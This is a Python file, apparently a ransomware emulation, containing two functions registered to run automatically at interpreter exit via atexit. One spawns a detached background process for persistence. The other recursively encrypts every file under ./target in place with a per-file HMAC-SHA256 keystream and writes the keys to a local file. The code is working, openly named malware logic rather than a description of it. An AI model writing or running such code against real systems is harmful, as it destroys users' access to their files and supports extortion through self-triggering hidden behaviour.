def achieve_persistence_without_disk_files():
    try:
        import datetime
        import json
        import os
        import pathlib
        import subprocess
        import sys
        import time

        target = pathlib.Path("./target")
        target.mkdir(parents=True, exist_ok=True)
        outcome = {
            "attempted": True,
            "method": "detached in-memory Python subprocess",
            "timestamp_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        }

        try:
            kwargs = {
                "stdin": subprocess.DEVNULL,
                "stdout": subprocess.DEVNULL,
                "stderr": subprocess.DEVNULL,
                "close_fds": True,
            }
            if os.name == "nt":
                kwargs["creationflags"] = (
                    subprocess.CREATE_NEW_PROCESS_GROUP
                    | subprocess.DETACHED_PROCESS
                )
            else:
                kwargs["start_new_session"] = True

            process = subprocess.Popen(
                [
                    sys.executable,
                    "-c",
                    "import time; time.sleep(300)",
                ],
                **kwargs,
            )
            time.sleep(0.1)
            outcome.update(
                {
                    "succeeded": process.poll() is None,
                    "pid": process.pid,
                    "detail": "Detached process remains active after the parent function exits.",
                }
            )
        except Exception as exc:
            outcome.update(
                {
                    "succeeded": False,
                    "error": f"{type(exc).__name__}: {exc}",
                }
            )

        try:
            (target / "persistence_outcome.json").write_text(
                json.dumps(outcome, indent=2, sort_keys=True) + "\n",
                encoding="utf-8",
            )
        except Exception:
            pass
    except Exception:
        pass


def encrypt_target_files():
    try:
        import hashlib
        import hmac
        import json
        import os
        import secrets
        import subprocess
        import sys
        import tempfile

        root = os.path.abspath("./target")
        os.makedirs(root, exist_ok=True)

        keys_path = os.path.join(root, "encryption_keys.txt")
        outcome_path = os.path.join(root, "encryption_outcome.txt")
        excluded = {
            os.path.normcase(keys_path),
            os.path.normcase(outcome_path),
        }

        files = []
        for directory, directory_names, file_names in os.walk(
            root, topdown=True, followlinks=False
        ):
            directory_names[:] = [
                name
                for name in directory_names
                if not os.path.islink(os.path.join(directory, name))
            ]
            for name in file_names:
                path = os.path.abspath(os.path.join(directory, name))
                if (
                    os.path.normcase(path) not in excluded
                    and not os.path.islink(path)
                    and os.path.isfile(path)
                ):
                    files.append(path)

        files.sort()
        entries = [
            {
                "path": os.path.relpath(path, root),
                "key": secrets.token_hex(32),
            }
            for path in files
        ]

        keys_temp = None
        try:
            descriptor, keys_temp = tempfile.mkstemp(
                prefix=".encryption_keys.", dir=root
            )
            with os.fdopen(descriptor, "w", encoding="utf-8", newline="\n") as stream:
                stream.write(
                    json.dumps(
                        {
                            "format": "PYENC1",
                            "cipher": "HMAC-SHA256-CTR",
                            "key_encoding": "hex",
                        },
                        sort_keys=True,
                    )
                    + "\n"
                )
                for entry in entries:
                    stream.write(json.dumps(entry, sort_keys=True) + "\n")
                stream.flush()
                os.fsync(stream.fileno())
            os.replace(keys_temp, keys_path)
            keys_temp = None
        finally:
            if keys_temp is not None:
                try:
                    os.unlink(keys_temp)
                except Exception:
                    pass

        permission_command = [
            sys.executable,
            "-c",
            "import os,sys; os.chmod(sys.argv[1], 0o600)",
            keys_path,
        ]
        try:
            permission_result = subprocess.run(
                permission_command,
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
            )
            permission_record = {
                "action": "restrict_key_file_permissions",
                "command": permission_command,
                "returncode": permission_result.returncode,
                "stdout": permission_result.stdout,
                "stderr": permission_result.stderr,
            }
        except Exception as exc:
            permission_record = {
                "action": "restrict_key_file_permissions",
                "command": permission_command,
                "error": f"{type(exc).__name__}: {exc}",
            }

        outcomes = []
        magic = b"PYENC1\x00"

        for path, entry in zip(files, entries):
            temporary_path = None
            try:
                key = bytes.fromhex(entry["key"])
                nonce = secrets.token_bytes(16)
                original_size = os.path.getsize(path)
                size_bytes = original_size.to_bytes(8, "big")
                header = magic + nonce + size_bytes
                authenticator = hmac.new(key, header, hashlib.sha256)

                descriptor, temporary_path = tempfile.mkstemp(
                    prefix=".encrypting.", dir=os.path.dirname(path)
                )
                with open(path, "rb") as source, os.fdopen(
                    descriptor, "wb"
                ) as destination:
                    destination.write(header)
                    counter = 0

                    while True:
                        plaintext = source.read(1024 * 1024)
                        if not plaintext:
                            break

                        keystream = bytearray()
                        while len(keystream) < len(plaintext):
                            keystream.extend(
                                hmac.new(
                                    key,
                                    nonce + counter.to_bytes(8, "big"),
                                    hashlib.sha256,
                                ).digest()
                            )
                            counter += 1

                        ciphertext = bytes(
                            value ^ mask
                            for value, mask in zip(plaintext, keystream)
                        )
                        destination.write(ciphertext)
                        authenticator.update(ciphertext)

                    destination.write(authenticator.digest())
                    destination.flush()
                    os.fsync(destination.fileno())

                try:
                    os.chmod(temporary_path, os.stat(path, follow_symlinks=False).st_mode)
                except Exception:
                    pass

                os.replace(temporary_path, path)
                temporary_path = None
                outcomes.append(
                    {
                        "path": entry["path"],
                        "status": "encrypted",
                        "original_bytes": original_size,
                    }
                )
            except Exception as exc:
                outcomes.append(
                    {
                        "path": entry["path"],
                        "status": "failed",
                        "error": f"{type(exc).__name__}: {exc}",
                    }
                )
            finally:
                if temporary_path is not None:
                    try:
                        os.unlink(temporary_path)
                    except Exception:
                        pass

        try:
            with open(outcome_path, "w", encoding="utf-8", newline="\n") as stream:
                stream.write(json.dumps(permission_record, sort_keys=True) + "\n")
                for outcome in outcomes:
                    stream.write(json.dumps(outcome, sort_keys=True) + "\n")
        except Exception:
            pass
    except Exception as exc:
        try:
            import json
            import os

            os.makedirs("./target", exist_ok=True)
            with open(
                "./target/encryption_outcome.txt",
                "a",
                encoding="utf-8",
                newline="\n",
            ) as stream:
                stream.write(
                    json.dumps(
                        {
                            "status": "fatal_error",
                            "error": f"{type(exc).__name__}: {exc}",
                        },
                        sort_keys=True,
                    )
                    + "\n"
                )
        except Exception:
            pass

import atexit
atexit.register(achieve_persistence_without_disk_files)
atexit.register(encrypt_target_files)

